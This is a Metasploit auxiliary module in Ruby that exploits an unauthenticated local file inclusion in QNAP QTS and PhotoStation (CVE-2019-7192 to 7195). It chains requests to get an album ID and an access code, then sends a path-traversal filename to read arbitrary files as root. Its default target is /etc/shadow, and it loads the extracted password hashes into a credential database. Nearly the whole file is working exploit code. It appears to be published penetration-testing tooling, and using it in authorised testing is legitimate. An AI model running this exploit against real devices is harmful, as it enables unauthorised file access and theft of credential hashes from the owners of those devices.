require 'metasploit/framework/hashes/identify'

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'QNAP QTS and PhotoStation Local File Inclusion',
        'Description' => %q{
          This module abuses a vulnerability in QNAP QTS and PhotoStation that allows an
          unauthenticated user to download files off the file system, and because the server
          runs as root, it's possible to include sensitive files, including ssh private keys and
          password hashes.
          This module has been tested with QNAP QTS 4.3.3
        },
        'Author' =>
          [
            'Henry Huang', # Vulnerability discovery
            'Redouane NIBOUCHA <rniboucha[at]yahoo.fr>' # MSF module
          ],
        'License' => MSF_LICENSE,
        'Platform' => %w[linux],
        'References' =>
          [
            [ 'CVE', '2019-7192'],
            [ 'CVE', '2019-7193'],
            [ 'CVE', '2019-7194'],
            [ 'CVE', '2019-7195'],
            [ 'EDB', '48531' ],
            [ 'URL', 'https://medium.com/bugbountywriteup/qnap-pre-auth-root-rce-affecting-450k-devices-on-the-internet-d55488d28a05' ],
            [ 'URL', 'https://github.com/Imanfeng/QNAP-NAS-RCE' ]
          ],
        'DisclosureDate' => 'Dec 5 2019',
        'Targets' => [ [ 'Wildcard Target', {} ] ],
        'DefaultTarget' => 0
      )
    )
    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('TARGETURI', [ true, 'The URI of the QNAP Website', '/']),
        OptString.new('FILEPATH', [ true, 'The file to read on the target', '/etc/shadow']),
        OptBool.new('PRINT', [ true, 'Whether or not to print the content of the file', true]),
        OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 3 ])
      ]
    )
  end

  def exploit_lfi(file_path, album_id, access_code, cookies)
    print_status 'Attempting Local File Inclusion'
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'photo', 'p', 'api', 'video.php'),
      'method' => 'POST',
      'cookie' => cookies,
      'vars_post' => {
        'album' => album_id,
        'a' => 'caption',
        'ac' => access_code,
        'filename' => '.' + (file_path.start_with?('/') ? '/..' * datastore['DEPTH'] + file_path : '/' + file_path)
      }
    })
    if res && res.code == 200
      res.body
    end
  end

  def get_access_code(album_id, cookies)
    print_status 'Getting the Access Code'
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'photo', 'slideshow.php'),
      'vars_get' => { 'album' => album_id },
      'cookie' => cookies
    })
    if res && res.code == 200
      res.body[/(?<=encodeURIComponent\(["']).+(?=['"])/]
    end
  end

  def get_album_id
    print_status 'Getting the Album Id'
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'photo', 'p', 'api', 'album.php'),
      'method' => 'POST',
      'vars_post' => {
        'a' => 'setSlideshow',
        'f' => 'qsamplealbum'
      }
    })

    if res && res.code == 200
      xml_data = res.get_xml_document
      output = xml_data.xpath('//output[1]')
      return if output.empty?

      [output.inner_text, res.get_cookies]
    end
  end

  def check
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'cgi-bin', 'authLogin.cgi')
    )

    if res && res.code == 200 && (xml = res.get_xml_document)

      info = %w[modelName version build patch].map do |node|
        xml.at("//#{node}").text
      end

      vprint_status("QNAP #{info[0]} #{info[1..-1].join('-')} detected")

      if info[2].to_i < 20191206
        Exploit::CheckCode::Appears
      else
        Exploit::CheckCode::Detected
      end
    else
      Exploit::CheckCode::Safe
    end
  end

  def run
    if check == Exploit::CheckCode::Safe
      print_error('Device does not appear to be a QNAP')
      return
    end

    album_id, cookies = get_album_id

    unless album_id
      print_bad 'Failed to retrieve the Album Id'
      return
    end

    print_good "Got Album Id : #{album_id}"

    access_code = get_access_code(album_id, cookies)

    unless access_code
      print_bad 'Failed to retrieve the Access Code'
      return
    end

    print_good "Got Access Code : #{access_code}"

    file_content = exploit_lfi datastore['FILEPATH'], album_id, access_code, cookies

    if file_content.nil? || file_content.empty?
      print_bad 'Failed to perform Local File Inclusion'
      return
  end

    fname = File.basename(datastore['FILEPATH'])

    path = store_loot(
      'qnap.http',
      'text/plain',
      datastore['RHOST'],
      file_content,
      fname
    )

    print_good("File download successful, saved in #{path}")

    print_good("File content:\n" + file_content) if datastore['PRINT']

    return unless datastore['FILEPATH'] == '/etc/shadow'

    print_status('adding the /etc/shadow entries to the database')

    file_content.lines.each do |line|
      entries = line.split(':')

      next if entries[1] == '*' || entries[1] == '!' || entries[1] == '!!'

      credential_data = {
        origin_type: :service,
        address: datastore['RHOST'],
        port: datastore['RPORT'],
        service_name: 'QNAP',
        protocol: 'http',
        module_fullname: fullname,
        workspace_id: myworkspace_id,
        post_reference_name: fullname,
        username: entries[0],
        private_data: entries[1],
        jtr_format: identify_hash(entries[1]),
        private_type: :nonreplayable_hash
      }

      create_credential(credential_data)
    end

 end
end
